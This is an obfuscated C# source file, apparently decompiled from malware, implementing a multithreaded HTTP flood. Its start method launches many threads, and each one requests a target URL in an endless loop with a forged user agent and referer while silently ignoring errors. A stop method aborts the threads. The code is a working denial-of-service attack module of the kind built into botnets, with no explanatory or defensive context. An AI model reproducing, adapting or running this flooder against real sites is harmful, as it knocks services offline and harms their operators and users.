using System;
using System.Net;
using System.Threading;
using Microsoft.VisualBasic.CompilerServices;

public class UlzVJSpkOQwRWeUzJJHMjqx
{
	private class NblGUHtUqpSyRDHgHSMebxU
	{
		private string yHISpkOPvDVdTytusxjpwOo;

		private string nEtwnNpVTBpKzqFPxxkkMUh;

		private string JdIgxKyvpIFbLWcYjBCXZiG;

		private WebClient mQgNTmujPLLJOzszeFqGKNF;

		private int dHlVRGaQHVfOOBnPlxMtLwB;

		public NblGUHtUqpSyRDHgHSMebxU(string aPMGYVsOmsoBESnpyJEgwPj, int QLzfopnsdWeIVUkoqiIXPzh, string jFhlzKesfSsPOqXobfFfqkD, string zWsRJFRhwSGPmhLNtOTbQwF)
		{
			mQgNTmujPLLJOzszeFqGKNF = new WebClient();
			yHISpkOPvDVdTytusxjpwOo = aPMGYVsOmsoBESnpyJEgwPj;
			dHlVRGaQHVfOOBnPlxMtLwB = QLzfopnsdWeIVUkoqiIXPzh;
			nEtwnNpVTBpKzqFPxxkkMUh = jFhlzKesfSsPOqXobfFfqkD;
			JdIgxKyvpIFbLWcYjBCXZiG = zWsRJFRhwSGPmhLNtOTbQwF;
		}

		public void Send()
		{
			while (true)
			{
				try
				{
					if (!ouOWLqmmlpbUbGgSilogFiN)
					{
						mQgNTmujPLLJOzszeFqGKNF.Headers.Add("GET: " + yHISpkOPvDVdTytusxjpwOo + " HTTP/1.1");
					}
					else
					{
						mQgNTmujPLLJOzszeFqGKNF.Headers.Add("POST: " + yHISpkOPvDVdTytusxjpwOo + " HTTP/1.1");
					}
					mQgNTmujPLLJOzszeFqGKNF.Headers.Add(HttpRequestHeader.UserAgent, nEtwnNpVTBpKzqFPxxkkMUh);
					mQgNTmujPLLJOzszeFqGKNF.Headers.Add(HttpRequestHeader.Referer, JdIgxKyvpIFbLWcYjBCXZiG);
					mQgNTmujPLLJOzszeFqGKNF.DownloadString(yHISpkOPvDVdTytusxjpwOo);
					Thread.Sleep(dHlVRGaQHVfOOBnPlxMtLwB);
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					Thread.Sleep(dHlVRGaQHVfOOBnPlxMtLwB);
					ProjectData.ClearProjectError();
				}
			}
		}
	}

	private static ThreadStart[] cooEILDbqjTBEYBFTQyMllN;

	private static Thread[] VhKdJgyYyKEWGcMXcZkCQYZ;

	public static string iHBegNTmukQLMKPzHOeGFVL;

	public static string NFeHljRGaRIWgPOCCdlxatZ;

	public static string xPbPNHZWscntpBSTopzXEhw;

	public static bool ouOWLqmmlpbUbGgSilogFiN;

	public static int wshCriwHppcPqNZnVmYcCqn;

	public static bool hzwUpOUQcftPRakfIYqLeYO;

	private static NblGUHtUqpSyRDHgHSMebxU[] IQRPUFyGjwvMQTKjyqbJLgJ;

	public static int skgsJYthqOJmoVpuDsYghfk;

	public static void IPWBNNcgjazPIrZcwZdrnXk()
	{
		checked
		{
			VhKdJgyYyKEWGcMXcZkCQYZ = new Thread[skgsJYthqOJmoVpuDsYghfk - 1 + 1];
			cooEILDbqjTBEYBFTQyMllN = new ThreadStart[skgsJYthqOJmoVpuDsYghfk - 1 + 1];
			IQRPUFyGjwvMQTKjyqbJLgJ = new NblGUHtUqpSyRDHgHSMebxU[skgsJYthqOJmoVpuDsYghfk - 1 + 1];
			if (!iHBegNTmukQLMKPzHOeGFVL.StartsWith("http://"))
			{
				iHBegNTmukQLMKPzHOeGFVL = "http://" + iHBegNTmukQLMKPzHOeGFVL;
			}
			int num = skgsJYthqOJmoVpuDsYghfk - 1;
			for (int i = 0; i <= num; i++)
			{
				IQRPUFyGjwvMQTKjyqbJLgJ[i] = new NblGUHtUqpSyRDHgHSMebxU(iHBegNTmukQLMKPzHOeGFVL, wshCriwHppcPqNZnVmYcCqn, NFeHljRGaRIWgPOCCdlxatZ, xPbPNHZWscntpBSTopzXEhw);
				cooEILDbqjTBEYBFTQyMllN[i] = IQRPUFyGjwvMQTKjyqbJLgJ[i].Send;
				VhKdJgyYyKEWGcMXcZkCQYZ[i] = new Thread(cooEILDbqjTBEYBFTQyMllN[i]);
				VhKdJgyYyKEWGcMXcZkCQYZ[i].Start();
			}
			hzwUpOUQcftPRakfIYqLeYO = true;
		}
	}

	public static void KKltGiChFXwXicueBkvBwJa()
	{
		checked
		{
			int num = skgsJYthqOJmoVpuDsYghfk - 1;
			for (int i = 0; i <= num; i++)
			{
				try
				{
					VhKdJgyYyKEWGcMXcZkCQYZ[i].Abort();
					VhKdJgyYyKEWGcMXcZkCQYZ[i] = null;
					cooEILDbqjTBEYBFTQyMllN[i] = null;
					IQRPUFyGjwvMQTKjyqbJLgJ[i] = null;
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
			}
			hzwUpOUQcftPRakfIYqLeYO = false;
		}
	}
}
